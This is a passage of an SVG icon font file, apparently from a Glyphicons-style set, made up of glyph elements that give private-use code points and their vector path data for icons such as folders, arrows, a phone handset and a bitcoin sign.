<glyph unicode="&#xe174;" d="M1100 1000v-269l-103 -103l-134 134q-15 15 -33.5 16.5t-34.5 -12.5l-266 -266h-329v-400h-150q-21 0 -35.5 14.5t-14.5 35.5v1000q0 20 14.5 35t35.5 15h250v-300h500v300h100zM700 1000h-100v200h100v-200zM1202 572l70 -70q15 -15 15 -35.5t-15 -35.5l-131 -131 l131 -131q15 -15 15 -35.5t-15 -35.5l-70 -70q-15 -15 -35.5 -15t-35.5 15l-131 131l-131 -131q-15 -15 -35.5 -15t-35.5 15l-70 70q-15 15 -15 35.5t15 35.5l131 131l-131 131q-15 15 -15 35.5t15 35.5l70 70q15 15 35.5 15t35.5 -15l131 -131l131 131q15 15 35.5 15 t35.5 -15z" />
<glyph unicode="&#xe175;" d="M1100 1000v-300h-350q-21 0 -35.5 -14.5t-14.5 -35.5v-150h-500v-400h-150q-21 0 -35.5 14.5t-14.5 35.5v1000q0 20 14.5 35t35.5 15h250v-300h500v300h100zM700 1000h-100v200h100v-200zM850 600h100q21 0 35.5 -14.5t14.5 -35.5v-250h150q21 0 25 -10.5t-10 -24.5 l-230 -230q-14 -14 -35 -14t-35 14l-230 230q-14 14 -10 24.5t25 10.5h150v250q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe176;" d="M1100 1000v-400l-165 165q-14 15 -35 15t-35 -15l-263 -265h-402v-400h-150q-21 0 -35.5 14.5t-14.5 35.5v1000q0 20 14.5 35t35.5 15h250v-300h500v300h100zM700 1000h-100v200h100v-200zM935 565l230 -229q14 -15 10 -25.5t-25 -10.5h-150v-250q0 -20 -14.5 -35 t-35.5 -15h-100q-21 0 -35.5 15t-14.5 35v250h-150q-21 0 -25 10.5t10 25.5l230 229q14 15 35 15t35 -15z" />
<glyph unicode="&#xe177;" d="M50 1100h1100q21 0 35.5 -14.5t14.5 -35.5v-150h-1200v150q0 21 14.5 35.5t35.5 14.5zM1200 800v-550q0 -21 -14.5 -35.5t-35.5 -14.5h-1100q-21 0 -35.5 14.5t-14.5 35.5v550h1200zM100 500v-200h400v200h-400z" />
<glyph unicode="&#xe178;" d="M935 1165l248 -230q14 -14 14 -35t-14 -35l-248 -230q-14 -14 -24.5 -10t-10.5 25v150h-400v200h400v150q0 21 10.5 25t24.5 -10zM200 800h-50q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5h50v-200zM400 800h-100v200h100v-200zM18 435l247 230 q14 14 24.5 10t10.5 -25v-150h400v-200h-400v-150q0 -21 -10.5 -25t-24.5 10l-247 230q-15 14 -15 35t15 35zM900 300h-100v200h100v-200zM1000 500h51q20 0 34.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-34.5 -14.5h-51v200z" />
<glyph unicode="&#xe179;" d="M862 1073l276 116q25 18 43.5 8t18.5 -41v-1106q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v397q-4 1 -11 5t-24 17.5t-30 29t-24 42t-11 56.5v359q0 31 18.5 65t43.5 52zM550 1200q22 0 34.5 -12.5t14.5 -24.5l1 -13v-450q0 -28 -10.5 -59.5 t-25 -56t-29 -45t-25.5 -31.5l-10 -11v-447q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v447q-4 4 -11 11.5t-24 30.5t-30 46t-24 55t-11 60v450q0 2 0.5 5.5t4 12t8.5 15t14.5 12t22.5 5.5q20 0 32.5 -12.5t14.5 -24.5l3 -13v-350h100v350v5.5t2.5 12 t7 15t15 12t25.5 5.5q23 0 35.5 -12.5t13.5 -24.5l1 -13v-350h100v350q0 2 0.5 5.5t3 12t7 15t15 12t24.5 5.5z" />
<glyph unicode="&#xe180;" d="M1200 1100v-56q-4 0 -11 -0.5t-24 -3t-30 -7.5t-24 -15t-11 -24v-888q0 -22 25 -34.5t50 -13.5l25 -2v-56h-400v56q75 0 87.5 6.5t12.5 43.5v394h-500v-394q0 -37 12.5 -43.5t87.5 -6.5v-56h-400v56q4 0 11 0.5t24 3t30 7.5t24 15t11 24v888q0 22 -25 34.5t-50 13.5 l-25 2v56h400v-56q-75 0 -87.5 -6.5t-12.5 -43.5v-394h500v394q0 37 -12.5 43.5t-87.5 6.5v56h400z" />
<glyph unicode="&#xe181;" d="M675 1000h375q21 0 35.5 -14.5t14.5 -35.5v-150h-105l-295 -98v98l-200 200h-400l100 100h375zM100 900h300q41 0 70.5 -29.5t29.5 -70.5v-500q0 -41 -29.5 -70.5t-70.5 -29.5h-300q-41 0 -70.5 29.5t-29.5 70.5v500q0 41 29.5 70.5t70.5 29.5zM100 800v-200h300v200 h-300zM1100 535l-400 -133v163l400 133v-163zM100 500v-200h300v200h-300zM1100 398v-248q0 -21 -14.5 -35.5t-35.5 -14.5h-375l-100 -100h-375l-100 100h400l200 200h105z" />
<glyph unicode="&#xe182;" d="M17 1007l162 162q17 17 40 14t37 -22l139 -194q14 -20 11 -44.5t-20 -41.5l-119 -118q102 -142 228 -268t267 -227l119 118q17 17 42.5 19t44.5 -12l192 -136q19 -14 22.5 -37.5t-13.5 -40.5l-163 -162q-3 -1 -9.5 -1t-29.5 2t-47.5 6t-62.5 14.5t-77.5 26.5t-90 42.5 t-101.5 60t-111 83t-119 108.5q-74 74 -133.5 150.5t-94.5 138.5t-60 119.5t-34.5 100t-15 74.5t-4.5 48z" />
<glyph unicode="&#xe183;" d="M600 1100q92 0 175 -10.5t141.5 -27t108.5 -36.5t81.5 -40t53.5 -37t31 -27l9 -10v-200q0 -21 -14.5 -33t-34.5 -9l-202 34q-20 3 -34.5 20t-14.5 38v146q-141 24 -300 24t-300 -24v-146q0 -21 -14.5 -38t-34.5 -20l-202 -34q-20 -3 -34.5 9t-14.5 33v200q3 4 9.5 10.5 t31 26t54 37.5t80.5 39.5t109 37.5t141 26.5t175 10.5zM600 795q56 0 97 -9.5t60 -23.5t30 -28t12 -24l1 -10v-50l365 -303q14 -15 24.5 -40t10.5 -45v-212q0 -21 -14.5 -35.5t-35.5 -14.5h-1100q-21 0 -35.5 14.5t-14.5 35.5v212q0 20 10.5 45t24.5 40l365 303v50 q0 4 1 10.5t12 23t30 29t60 22.5t97 10z" />
<glyph unicode="&#xe184;" d="M1100 700l-200 -200h-600l-200 200v500h200v-200h200v200h200v-200h200v200h200v-500zM250 400h700q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-12l137 -100h-950l137 100h-12q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5zM50 100h1100q21 0 35.5 -14.5 t14.5 -35.5v-50h-1200v50q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe185;" d="M700 1100h-100q-41 0 -70.5 -29.5t-29.5 -70.5v-1000h300v1000q0 41 -29.5 70.5t-70.5 29.5zM1100 800h-100q-41 0 -70.5 -29.5t-29.5 -70.5v-700h300v700q0 41 -29.5 70.5t-70.5 29.5zM400 0h-300v400q0 41 29.5 70.5t70.5 29.5h100q41 0 70.5 -29.5t29.5 -70.5v-400z " />
<glyph unicode="&#xe186;" d="M200 1100h700q124 0 212 -88t88 -212v-500q0 -124 -88 -212t-212 -88h-700q-124 0 -212 88t-88 212v500q0 124 88 212t212 88zM100 900v-700h900v700h-900zM500 700h-200v-100h200v-300h-300v100h200v100h-200v300h300v-100zM900 700v-300l-100 -100h-200v500h200z M700 700v-300h100v300h-100z" />
<glyph unicode="&#xe187;" d="M200 1100h700q124 0 212 -88t88 -212v-500q0 -124 -88 -212t-212 -88h-700q-124 0 -212 88t-88 212v500q0 124 88 212t212 88zM100 900v-700h900v700h-900zM500 300h-100v200h-100v-200h-100v500h100v-200h100v200h100v-500zM900 700v-300l-100 -100h-200v500h200z M700 700v-300h100v300h-100z" />
<glyph unicode="&#xe188;" d="M200 1100h700q124 0 212 -88t88 -212v-500q0 -124 -88 -212t-212 -88h-700q-124 0 -212 88t-88 212v500q0 124 88 212t212 88zM100 900v-700h900v700h-900zM500 700h-200v-300h200v-100h-300v500h300v-100zM900 700h-200v-300h200v-100h-300v500h300v-100z" />
<glyph unicode="&#xe189;" d="M200 1100h700q124 0 212 -88t88 -212v-500q0 -124 -88 -212t-212 -88h-700q-124 0 -212 88t-88 212v500q0 124 88 212t212 88zM100 900v-700h900v700h-900zM500 400l-300 150l300 150v-300zM900 550l-300 -150v300z" />
<glyph unicode="&#xe190;" d="M200 1100h700q124 0 212 -88t88 -212v-500q0 -124 -88 -212t-212 -88h-700q-124 0 -212 88t-88 212v500q0 124 88 212t212 88zM100 900v-700h900v700h-900zM900 300h-700v500h700v-500zM800 700h-130q-38 0 -66.5 -43t-28.5 -108t27 -107t68 -42h130v300zM300 700v-300 h130q41 0 68 42t27 107t-28.5 108t-66.5 43h-130z" />
<glyph unicode="&#xe191;" d="M200 1100h700q124 0 212 -88t88 -212v-500q0 -124 -88 -212t-212 -88h-700q-124 0 -212 88t-88 212v500q0 124 88 212t212 88zM100 900v-700h900v700h-900zM500 700h-200v-100h200v-300h-300v100h200v100h-200v300h300v-100zM900 300h-100v400h-100v100h200v-500z M700 300h-100v100h100v-100z" />
<glyph unicode="&#xe192;" d="M200 1100h700q124 0 212 -88t88 -212v-500q0 -124 -88 -212t-212 -88h-700q-124 0 -212 88t-88 212v500q0 124 88 212t212 88zM100 900v-700h900v700h-900zM300 700h200v-400h-300v500h100v-100zM900 300h-100v400h-100v100h200v-500zM300 600v-200h100v200h-100z M700 300h-100v100h100v-100z" />
<glyph unicode="&#xe193;" d="M200 1100h700q124 0 212 -88t88 -212v-500q0 -124 -88 -212t-212 -88h-700q-124 0 -212 88t-88 212v500q0 124 88 212t212 88zM100 900v-700h900v700h-900zM500 500l-199 -200h-100v50l199 200v150h-200v100h300v-300zM900 300h-100v400h-100v100h200v-500zM701 300h-100 v100h100v-100z" />
<glyph unicode="&#xe194;" d="M600 1191q120 0 229.5 -47t188.5 -126t126 -188.5t47 -229.5t-47 -229.5t-126 -188.5t-188.5 -126t-229.5 -47t-229.5 47t-188.5 126t-126 188.5t-47 229.5t47 229.5t126 188.5t188.5 126t229.5 47zM600 1021q-114 0 -211 -56.5t-153.5 -153.5t-56.5 -211t56.5 -211 t153.5 -153.5t211 -56.5t211 56.5t153.5 153.5t56.5 211t-56.5 211t-153.5 153.5t-211 56.5zM800 700h-300v-200h300v-100h-300l-100 100v200l100 100h300v-100z" />
<glyph unicode="&#xe195;" d="M600 1191q120 0 229.5 -47t188.5 -126t126 -188.5t47 -229.5t-47 -229.5t-126 -188.5t-188.5 -126t-229.5 -47t-229.5 47t-188.5 126t-126 188.5t-47 229.5t47 229.5t126 188.5t188.5 126t229.5 47zM600 1021q-114 0 -211 -56.5t-153.5 -153.5t-56.5 -211t56.5 -211 t153.5 -153.5t211 -56.5t211 56.5t153.5 153.5t56.5 211t-56.5 211t-153.5 153.5t-211 56.5zM800 700v-100l-50 -50l100 -100v-50h-100l-100 100h-150v-100h-100v400h300zM500 700v-100h200v100h-200z" />
<glyph unicode="&#xe197;" d="M503 1089q110 0 200.5 -59.5t134.5 -156.5q44 14 90 14q120 0 205 -86.5t85 -207t-85 -207t-205 -86.5h-128v250q0 21 -14.5 35.5t-35.5 14.5h-300q-21 0 -35.5 -14.5t-14.5 -35.5v-250h-222q-80 0 -136 57.5t-56 136.5q0 69 43 122.5t108 67.5q-2 19 -2 37q0 100 49 185 t134 134t185 49zM525 500h150q10 0 17.5 -7.5t7.5 -17.5v-275h137q21 0 26 -11.5t-8 -27.5l-223 -244q-13 -16 -32 -16t-32 16l-223 244q-13 16 -8 27.5t26 11.5h137v275q0 10 7.5 17.5t17.5 7.5z" />
<glyph unicode="&#xe198;" d="M502 1089q110 0 201 -59.5t135 -156.5q43 15 89 15q121 0 206 -86.5t86 -206.5q0 -99 -60 -181t-150 -110l-378 360q-13 16 -31.5 16t-31.5 -16l-381 -365h-9q-79 0 -135.5 57.5t-56.5 136.5q0 69 43 122.5t108 67.5q-2 19 -2 38q0 100 49 184.5t133.5 134t184.5 49.5z M632 467l223 -228q13 -16 8 -27.5t-26 -11.5h-137v-275q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v275h-137q-21 0 -26 11.5t8 27.5q199 204 223 228q19 19 31.5 19t32.5 -19z" />
<glyph unicode="&#xe199;" d="M700 100v100h400l-270 300h170l-270 300h170l-300 333l-300 -333h170l-270 -300h170l-270 -300h400v-100h-50q-21 0 -35.5 -14.5t-14.5 -35.5v-50h400v50q0 21 -14.5 35.5t-35.5 14.5h-50z" />
<glyph unicode="&#xe200;" d="M600 1179q94 0 167.5 -56.5t99.5 -145.5q89 -6 150.5 -71.5t61.5 -155.5q0 -61 -29.5 -112.5t-79.5 -82.5q9 -29 9 -55q0 -74 -52.5 -126.5t-126.5 -52.5q-55 0 -100 30v-251q21 0 35.5 -14.5t14.5 -35.5v-50h-300v50q0 21 14.5 35.5t35.5 14.5v251q-45 -30 -100 -30 q-74 0 -126.5 52.5t-52.5 126.5q0 18 4 38q-47 21 -75.5 65t-28.5 97q0 74 52.5 126.5t126.5 52.5q5 0 23 -2q0 2 -1 10t-1 13q0 116 81.5 197.5t197.5 81.5z" />
<glyph unicode="&#xe201;" d="M1010 1010q111 -111 150.5 -260.5t0 -299t-150.5 -260.5q-83 -83 -191.5 -126.5t-218.5 -43.5t-218.5 43.5t-191.5 126.5q-111 111 -150.5 260.5t0 299t150.5 260.5q83 83 191.5 126.5t218.5 43.5t218.5 -43.5t191.5 -126.5zM476 1065q-4 0 -8 -1q-121 -34 -209.5 -122.5 t-122.5 -209.5q-4 -12 2.5 -23t18.5 -14l36 -9q3 -1 7 -1q23 0 29 22q27 96 98 166q70 71 166 98q11 3 17.5 13.5t3.5 22.5l-9 35q-3 13 -14 19q-7 4 -15 4zM512 920q-4 0 -9 -2q-80 -24 -138.5 -82.5t-82.5 -138.5q-4 -13 2 -24t19 -14l34 -9q4 -1 8 -1q22 0 28 21 q18 58 58.5 98.5t97.5 58.5q12 3 18 13.5t3 21.5l-9 35q-3 12 -14 19q-7 4 -15 4zM719.5 719.5q-49.5 49.5 -119.5 49.5t-119.5 -49.5t-49.5 -119.5t49.5 -119.5t119.5 -49.5t119.5 49.5t49.5 119.5t-49.5 119.5zM855 551q-22 0 -28 -21q-18 -58 -58.5 -98.5t-98.5 -57.5 q-11 -4 -17 -14.5t-3 -21.5l9 -35q3 -12 14 -19q7 -4 15 -4q4 0 9 2q80 24 138.5 82.5t82.5 138.5q4 13 -2.5 24t-18.5 14l-34 9q-4 1 -8 1zM1000 515q-23 0 -29 -22q-27 -96 -98 -166q-70 -71 -166 -98q-11 -3 -17.5 -13.5t-3.5 -22.5l9 -35q3 -13 14 -19q7 -4 15 -4 q4 0 8 1q121 34 209.5 122.5t122.5 209.5q4 12 -2.5 23t-18.5 14l-36 9q-3 1 -7 1z" />
<glyph unicode="&#xe202;" d="M700 800h300v-380h-180v200h-340v-200h-380v755q0 10 7.5 17.5t17.5 7.5h575v-400zM1000 900h-200v200zM700 300h162l-212 -212l-212 212h162v200h100v-200zM520 0h-395q-10 0 -17.5 7.5t-7.5 17.5v395zM1000 220v-195q0 -10 -7.5 -17.5t-17.5 -7.5h-195z" />
<glyph unicode="&#xe203;" d="M700 800h300v-520l-350 350l-550 -550v1095q0 10 7.5 17.5t17.5 7.5h575v-400zM1000 900h-200v200zM862 200h-162v-200h-100v200h-162l212 212zM480 0h-355q-10 0 -17.5 7.5t-7.5 17.5v55h380v-80zM1000 80v-55q0 -10 -7.5 -17.5t-17.5 -7.5h-155v80h180z" />
<glyph unicode="&#xe204;" d="M1162 800h-162v-200h100l100 -100h-300v300h-162l212 212zM200 800h200q27 0 40 -2t29.5 -10.5t23.5 -30t7 -57.5h300v-100h-600l-200 -350v450h100q0 36 7 57.5t23.5 30t29.5 10.5t40 2zM800 400h240l-240 -400h-800l300 500h500v-100z" />
<glyph unicode="&#xe205;" d="M650 1100h100q21 0 35.5 -14.5t14.5 -35.5v-50h50q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-300q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5h50v50q0 21 14.5 35.5t35.5 14.5zM1000 850v150q41 0 70.5 -29.5t29.5 -70.5v-800 q0 -41 -29.5 -70.5t-70.5 -29.5h-600q-1 0 -20 4l246 246l-326 326v324q0 41 29.5 70.5t70.5 29.5v-150q0 -62 44 -106t106 -44h300q62 0 106 44t44 106zM412 250l-212 -212v162h-200v100h200v162z" />
<glyph unicode="&#xe206;" d="M450 1100h100q21 0 35.5 -14.5t14.5 -35.5v-50h50q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-300q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5h50v50q0 21 14.5 35.5t35.5 14.5zM800 850v150q41 0 70.5 -29.5t29.5 -70.5v-500 h-200v-300h200q0 -36 -7 -57.5t-23.5 -30t-29.5 -10.5t-40 -2h-600q-41 0 -70.5 29.5t-29.5 70.5v800q0 41 29.5 70.5t70.5 29.5v-150q0 -62 44 -106t106 -44h300q62 0 106 44t44 106zM1212 250l-212 -212v162h-200v100h200v162z" />
<glyph unicode="&#xe209;" d="M658 1197l637 -1104q23 -38 7 -65.5t-60 -27.5h-1276q-44 0 -60 27.5t7 65.5l637 1104q22 39 54 39t54 -39zM704 800h-208q-20 0 -32 -14.5t-8 -34.5l58 -302q4 -20 21.5 -34.5t37.5 -14.5h54q20 0 37.5 14.5t21.5 34.5l58 302q4 20 -8 34.5t-32 14.5zM500 300v-100h200 v100h-200z" />
<glyph unicode="&#xe210;" d="M425 1100h250q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5zM425 800h250q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5 t17.5 7.5zM825 800h250q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5zM25 500h250q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v150 q0 10 7.5 17.5t17.5 7.5zM425 500h250q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5zM825 500h250q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5 v150q0 10 7.5 17.5t17.5 7.5zM25 200h250q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5zM425 200h250q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5 t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5zM825 200h250q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5z" />
<glyph unicode="&#xe211;" d="M700 1200h100v-200h-100v-100h350q62 0 86.5 -39.5t-3.5 -94.5l-66 -132q-41 -83 -81 -134h-772q-40 51 -81 134l-66 132q-28 55 -3.5 94.5t86.5 39.5h350v100h-100v200h100v100h200v-100zM250 400h700q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-12l137 -100 h-950l138 100h-13q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5zM50 100h1100q21 0 35.5 -14.5t14.5 -35.5v-50h-1200v50q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe212;" d="M600 1300q40 0 68.5 -29.5t28.5 -70.5h-194q0 41 28.5 70.5t68.5 29.5zM443 1100h314q18 -37 18 -75q0 -8 -3 -25h328q41 0 44.5 -16.5t-30.5 -38.5l-175 -145h-678l-178 145q-34 22 -29 38.5t46 16.5h328q-3 17 -3 25q0 38 18 75zM250 700h700q21 0 35.5 -14.5 t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-150v-200l275 -200h-950l275 200v200h-150q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5zM50 100h1100q21 0 35.5 -14.5t14.5 -35.5v-50h-1200v50q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe213;" d="M600 1181q75 0 128 -53t53 -128t-53 -128t-128 -53t-128 53t-53 128t53 128t128 53zM602 798h46q34 0 55.5 -28.5t21.5 -86.5q0 -76 39 -183h-324q39 107 39 183q0 58 21.5 86.5t56.5 28.5h45zM250 400h700q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-13 l138 -100h-950l137 100h-12q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5zM50 100h1100q21 0 35.5 -14.5t14.5 -35.5v-50h-1200v50q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe214;" d="M600 1300q47 0 92.5 -53.5t71 -123t25.5 -123.5q0 -78 -55.5 -133.5t-133.5 -55.5t-133.5 55.5t-55.5 133.5q0 62 34 143l144 -143l111 111l-163 163q34 26 63 26zM602 798h46q34 0 55.5 -28.5t21.5 -86.5q0 -76 39 -183h-324q39 107 39 183q0 58 21.5 86.5t56.5 28.5h45 zM250 400h700q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-13l138 -100h-950l137 100h-12q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5zM50 100h1100q21 0 35.5 -14.5t14.5 -35.5v-50h-1200v50q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe215;" d="M600 1200l300 -161v-139h-300q0 -57 18.5 -108t50 -91.5t63 -72t70 -67.5t57.5 -61h-530q-60 83 -90.5 177.5t-30.5 178.5t33 164.5t87.5 139.5t126 96.5t145.5 41.5v-98zM250 400h700q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-13l138 -100h-950l137 100 h-12q-21 0 -35.5 14.5t-14.5 35.5t14.5 35.5t35.5 14.5zM50 100h1100q21 0 35.5 -14.5t14.5 -35.5v-50h-1200v50q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe216;" d="M600 1300q41 0 70.5 -29.5t29.5 -70.5v-78q46 -26 73 -72t27 -100v-50h-400v50q0 54 27 100t73 72v78q0 41 29.5 70.5t70.5 29.5zM400 800h400q54 0 100 -27t72 -73h-172v-100h200v-100h-200v-100h200v-100h-200v-100h200q0 -83 -58.5 -141.5t-141.5 -58.5h-400 q-83 0 -141.5 58.5t-58.5 141.5v400q0 83 58.5 141.5t141.5 58.5z" />
<glyph unicode="&#xe218;" d="M150 1100h900q21 0 35.5 -14.5t14.5 -35.5v-500q0 -21 -14.5 -35.5t-35.5 -14.5h-900q-21 0 -35.5 14.5t-14.5 35.5v500q0 21 14.5 35.5t35.5 14.5zM125 400h950q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-283l224 -224q13 -13 13 -31.5t-13 -32 t-31.5 -13.5t-31.5 13l-88 88h-524l-87 -88q-13 -13 -32 -13t-32 13.5t-13 32t13 31.5l224 224h-289q-10 0 -17.5 7.5t-7.5 17.5v50q0 10 7.5 17.5t17.5 7.5zM541 300l-100 -100h324l-100 100h-124z" />
<glyph unicode="&#xe219;" d="M200 1100h800q83 0 141.5 -58.5t58.5 -141.5v-200h-100q0 41 -29.5 70.5t-70.5 29.5h-250q-41 0 -70.5 -29.5t-29.5 -70.5h-100q0 41 -29.5 70.5t-70.5 29.5h-250q-41 0 -70.5 -29.5t-29.5 -70.5h-100v200q0 83 58.5 141.5t141.5 58.5zM100 600h1000q41 0 70.5 -29.5 t29.5 -70.5v-300h-1200v300q0 41 29.5 70.5t70.5 29.5zM300 100v-50q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v50h200zM1100 100v-50q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v50h200z" />
<glyph unicode="&#xe221;" d="M480 1165l682 -683q31 -31 31 -75.5t-31 -75.5l-131 -131h-481l-517 518q-32 31 -32 75.5t32 75.5l295 296q31 31 75.5 31t76.5 -31zM108 794l342 -342l303 304l-341 341zM250 100h800q21 0 35.5 -14.5t14.5 -35.5v-50h-900v50q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe223;" d="M1057 647l-189 506q-8 19 -27.5 33t-40.5 14h-400q-21 0 -40.5 -14t-27.5 -33l-189 -506q-8 -19 1.5 -33t30.5 -14h625v-150q0 -21 14.5 -35.5t35.5 -14.5t35.5 14.5t14.5 35.5v150h125q21 0 30.5 14t1.5 33zM897 0h-595v50q0 21 14.5 35.5t35.5 14.5h50v50 q0 21 14.5 35.5t35.5 14.5h48v300h200v-300h47q21 0 35.5 -14.5t14.5 -35.5v-50h50q21 0 35.5 -14.5t14.5 -35.5v-50z" />
<glyph unicode="&#xe224;" d="M900 800h300v-575q0 -10 -7.5 -17.5t-17.5 -7.5h-375v591l-300 300v84q0 10 7.5 17.5t17.5 7.5h375v-400zM1200 900h-200v200zM400 600h300v-575q0 -10 -7.5 -17.5t-17.5 -7.5h-650q-10 0 -17.5 7.5t-7.5 17.5v950q0 10 7.5 17.5t17.5 7.5h375v-400zM700 700h-200v200z " />
<glyph unicode="&#xe225;" d="M484 1095h195q75 0 146 -32.5t124 -86t89.5 -122.5t48.5 -142q18 -14 35 -20q31 -10 64.5 6.5t43.5 48.5q10 34 -15 71q-19 27 -9 43q5 8 12.5 11t19 -1t23.5 -16q41 -44 39 -105q-3 -63 -46 -106.5t-104 -43.5h-62q-7 -55 -35 -117t-56 -100l-39 -234q-3 -20 -20 -34.5 t-38 -14.5h-100q-21 0 -33 14.5t-9 34.5l12 70q-49 -14 -91 -14h-195q-24 0 -65 8l-11 -64q-3 -20 -20 -34.5t-38 -14.5h-100q-21 0 -33 14.5t-9 34.5l26 157q-84 74 -128 175l-159 53q-19 7 -33 26t-14 40v50q0 21 14.5 35.5t35.5 14.5h124q11 87 56 166l-111 95 q-16 14 -12.5 23.5t24.5 9.5h203q116 101 250 101zM675 1000h-250q-10 0 -17.5 -7.5t-7.5 -17.5v-50q0 -10 7.5 -17.5t17.5 -7.5h250q10 0 17.5 7.5t7.5 17.5v50q0 10 -7.5 17.5t-17.5 7.5z" />
<glyph unicode="&#xe226;" d="M641 900l423 247q19 8 42 2.5t37 -21.5l32 -38q14 -15 12.5 -36t-17.5 -34l-139 -120h-390zM50 1100h106q67 0 103 -17t66 -71l102 -212h823q21 0 35.5 -14.5t14.5 -35.5v-50q0 -21 -14 -40t-33 -26l-737 -132q-23 -4 -40 6t-26 25q-42 67 -100 67h-300q-62 0 -106 44 t-44 106v200q0 62 44 106t106 44zM173 928h-80q-19 0 -28 -14t-9 -35v-56q0 -51 42 -51h134q16 0 21.5 8t5.5 24q0 11 -16 45t-27 51q-18 28 -43 28zM550 727q-32 0 -54.5 -22.5t-22.5 -54.5t22.5 -54.5t54.5 -22.5t54.5 22.5t22.5 54.5t-22.5 54.5t-54.5 22.5zM130 389 l152 130q18 19 34 24t31 -3.5t24.5 -17.5t25.5 -28q28 -35 50.5 -51t48.5 -13l63 5l48 -179q13 -61 -3.5 -97.5t-67.5 -79.5l-80 -69q-47 -40 -109 -35.5t-103 51.5l-130 151q-40 47 -35.5 109.5t51.5 102.5zM380 377l-102 -88q-31 -27 2 -65l37 -43q13 -15 27.5 -19.5 t31.5 6.5l61 53q19 16 14 49q-2 20 -12 56t-17 45q-11 12 -19 14t-23 -8z" />
<glyph unicode="&#xe227;" d="M625 1200h150q10 0 17.5 -7.5t7.5 -17.5v-109q79 -33 131 -87.5t53 -128.5q1 -46 -15 -84.5t-39 -61t-46 -38t-39 -21.5l-17 -6q6 0 15 -1.5t35 -9t50 -17.5t53 -30t50 -45t35.5 -64t14.5 -84q0 -59 -11.5 -105.5t-28.5 -76.5t-44 -51t-49.5 -31.5t-54.5 -16t-49.5 -6.5 t-43.5 -1v-75q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v75h-100v-75q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v75h-175q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5h75v600h-75q-10 0 -17.5 7.5t-7.5 17.5v150 q0 10 7.5 17.5t17.5 7.5h175v75q0 10 7.5 17.5t17.5 7.5h150q10 0 17.5 -7.5t7.5 -17.5v-75h100v75q0 10 7.5 17.5t17.5 7.5zM400 900v-200h263q28 0 48.5 10.5t30 25t15 29t5.5 25.5l1 10q0 4 -0.5 11t-6 24t-15 30t-30 24t-48.5 11h-263zM400 500v-200h363q28 0 48.5 10.5 t30 25t15 29t5.5 25.5l1 10q0 4 -0.5 11t-6 24t-15 30t-30 24t-48.5 11h-363z" />
